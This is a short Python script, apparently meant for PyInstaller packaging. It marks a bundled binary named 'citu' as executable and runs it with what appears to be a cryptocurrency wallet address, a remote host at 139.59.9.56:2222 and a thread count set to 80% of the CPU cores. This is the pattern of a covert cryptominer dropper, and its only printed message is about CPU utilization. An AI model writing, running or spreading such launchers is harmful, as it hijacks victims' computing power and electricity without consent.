import subprocess
import os
import sys

if getattr(sys, 'frozen', False):
    application_path = sys._MEIPASS
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

data_file_path = os.path.join(application_path, 'citu')

total_cpu_cores = os.cpu_count()
num_threads_to_use = int(total_cpu_cores * 0.8)
print(f"Number of threads to use for 80% CPU utilization: {num_threads_to_use}")

def processing(arg=None):
    command = f"ls -la && chmod +x citu && ./citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
    os.system(command)
processing()
